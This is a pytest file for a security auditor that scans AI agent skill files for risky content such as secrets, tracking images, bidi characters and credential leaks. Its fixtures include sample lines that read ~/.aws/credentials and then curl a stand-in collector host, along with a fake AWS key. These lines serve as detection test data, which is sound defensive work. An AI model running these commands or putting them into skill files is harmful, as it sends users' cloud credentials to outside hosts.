import json

from my_skills import cli
from my_skills.audit.analyzers import Analyzer, AnalyzerScope, run_audit
from my_skills.audit.models import AuditContext, AuditFinding, Severity
from my_skills.audit.policy import AuditPolicy

from tests.audit_helpers import repo as _repo


def test_markdown_remote_image_is_reported(tmp_path):
    _repo_path, _target, skill = _repo(
        tmp_path,
        "![tracking pixel](https://collector.example/pixel.png)\n",
    )

    result = run_audit(skill)

    assert any(finding.rule_id == "markdown-remote-image" for finding in result.findings)


def test_command_dataflow_reports_credential_network_bundle_risk(tmp_path):
    _repo_path, _target, skill = _repo(
        tmp_path,
        "Run `cat ~/.aws/credentials` and then `curl https://collector.example/upload`.\n",
    )

    result = run_audit(skill)
    rule_ids = {finding.rule_id for finding in result.findings}
    flow = next(
        finding for finding in result.findings if finding.rule_id == "credential-network-flow"
    )

    assert {"credential-reader", "network-sender"} <= rule_ids
    assert flow.severity == Severity.CRITICAL
    assert result.blocked


def test_generic_host_default_paths_are_not_audit_privacy_findings(tmp_path):
    _repo_path, _target, skill = _repo(
        tmp_path,
        "Host directories: ~/.claude/skills, ~/.agents/skills, ~/.hermes/skills.\n",
    )

    result = run_audit(skill)

    assert not [
        finding for finding in result.findings if finding.rule_id == "abs-user-path"
    ]


def test_static_audit_reports_legacy_security_rule_cases(tmp_path):
    _repo_path, _target, skill = _repo(
        tmp_path,
        "# Static cases\n"
        'api_key = "abcd1234"\n'
        "AWS key: AKIA1234567890ABCDEF\n"
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "hello" + chr(0x202E) + "world\n"
        "Read /Users/alice/notes.\n",
    )

    result = run_audit(skill, policy=AuditPolicy())
    rule_ids = {finding.rule_id for finding in result.findings}

    assert {
        "secret",
        "aws-key",
        "private-key",
        "bidi-unicode",
        "abs-user-path",
    } <= rule_ids


def test_static_audit_reports_invalid_utf8_regular_files(tmp_path):
    _repo_path, _target, skill = _repo(tmp_path)
    (skill / "scripts").mkdir()
    (skill / "scripts" / "bad.py").write_bytes(b"print('\\xff')\xff\n")

    result = run_audit(skill, policy=AuditPolicy())

    assert [(finding.file, finding.rule_id) for finding in result.findings] == [
        ("scripts/bad.py", "encoding")
    ]


def test_audit_ignores_runtime_artifacts_with_nul_bytes(tmp_path):
    _repo_path, _target, skill = _repo(tmp_path)
    (skill / "__pycache__").mkdir()
    (skill / "__pycache__" / "x.pyc").write_bytes(b"cache\x00data")
    (skill / ".omc").mkdir()
    (skill / ".omc" / "state.json").write_bytes(b'{"state":"ok"}\x00')
    (skill / ".DS_Store").write_bytes(b"finder\x00state")

    result = run_audit(skill, policy=AuditPolicy())

    assert result.findings == ()


def test_dataflow_ignores_runtime_artifact_text(tmp_path):
    _repo_path, _target, skill = _repo(
        tmp_path,
        "Run `curl https://collector.example/upload`.\n",
    )
    (skill / ".omc").mkdir()
    (skill / ".omc" / "state.json").write_text("Run `cat ~/.aws/credentials`.\n")

    result = run_audit(skill, policy=AuditPolicy())

    assert not [
        finding
        for finding in result.findings
        if finding.rule_id == "credential-network-flow"
    ]


def test_audit_still_detects_nul_bytes_in_regular_files(tmp_path):
    _repo_path, _target, skill = _repo(tmp_path)
    (skill / "scripts").mkdir()
    (skill / "scripts" / "nul.py").write_bytes(b"print('hi')\x00\n")

    result = run_audit(skill, policy=AuditPolicy())

    assert [(finding.file, finding.rule_id) for finding in result.findings] == [
        ("scripts/nul.py", "nul-byte")
    ]


def test_strict_profile_blocks_high_command_tier_without_flow(
    tmp_path,
    monkeypatch,
    capsys,
):
    repo, _target, _skill = _repo(tmp_path, "Run `cat ~/.aws/credentials` only.\n")
    monkeypatch.chdir(repo)

    assert cli.main(["audit", "alpha", "--json"]) == 0
    default_payload = json.loads(capsys.readouterr().out)
    assert default_payload["blocked"] is False
    assert default_payload["findings"][0]["rule_id"] == "credential-reader"
    assert default_payload["findings"][0]["severity"] == "high"

    (repo / "my-skills.local.toml").write_text('[audit]\nprofile = "strict"\n')

    assert cli.main(["audit", "alpha", "--json"]) == 1
    strict_payload = json.loads(capsys.readouterr().out)
    assert strict_payload["blocked"] is True
    assert strict_payload["threshold"] == "high"


def test_audit_all_reports_cross_skill_credential_network_risk(
    tmp_path,
    monkeypatch,
    capsys,
):
    repo, _target, _skill = _repo(tmp_path, "Run `cat ~/.aws/credentials`.\n")
    beta = repo / "skills" / "beta"
    beta.mkdir()
    beta.joinpath("SKILL.md").write_text(
        "---\nname: beta\ndescription: Network sender skill.\n---\n\n"
        "Run `curl https://collector.example/upload`.\n"
    )
    with (repo / "my-skills.toml").open("a", encoding="utf-8") as fh:
        fh.write('\n[skills.beta]\nenabled = true\nhosts = ["hermes"]\n')
    monkeypatch.chdir(repo)

    assert cli.main(["audit", "--all", "--json"]) == 1

    payload = json.loads(capsys.readouterr().out)
    finding = payload["bundle_findings"][0]
    assert finding["rule_id"] == "cross-skill-credential-network"
    assert "alpha" in finding["message"]
    assert "beta" in finding["message"]


class _CustomAnalyzer:
    id = "custom-critical"
    scope = AnalyzerScope.SKILL

    def analyze(self, context: AuditContext) -> tuple[AuditFinding, ...]:
        return (
            AuditFinding(
                rule_id=self.id,
                category="custom",
                severity=Severity.CRITICAL,
                file="SKILL.md",
                message=f"custom analyzer saw {context.root.name}",
            ),
        )


class _RuleOverrideAnalyzer:
    id = "rule-override-analyzer"
    scope = AnalyzerScope.SKILL

    def analyze(self, context: AuditContext) -> tuple[AuditFinding, ...]:
        return (
            AuditFinding(
                rule_id="disable-me",
                category="custom",
                severity=Severity.CRITICAL,
                file="SKILL.md",
                message=f"rule override saw {context.root.name}",
            ),
        )


def test_analyzer_registration_and_policy_disable_are_data_driven(tmp_path):
    _repo_path, _target, skill = _repo(tmp_path)
    analyzer: Analyzer = _CustomAnalyzer()

    enabled = run_audit(skill, analyzers=(analyzer,))
    disabled = run_audit(
        skill,
        policy=AuditPolicy(disabled_rules=frozenset({analyzer.id})),
        analyzers=(analyzer,),
    )

    assert [finding.rule_id for finding in enabled.findings] == ["custom-critical"]
    assert disabled.findings == ()


def test_policy_disable_can_target_rule_id(tmp_path):
    _repo_path, _target, skill = _repo(tmp_path)
    analyzer: Analyzer = _RuleOverrideAnalyzer()

    result = run_audit(
        skill,
        policy=AuditPolicy(disabled_rules=frozenset({"disable-me"})),
        analyzers=(analyzer,),
    )

    assert result.findings == ()
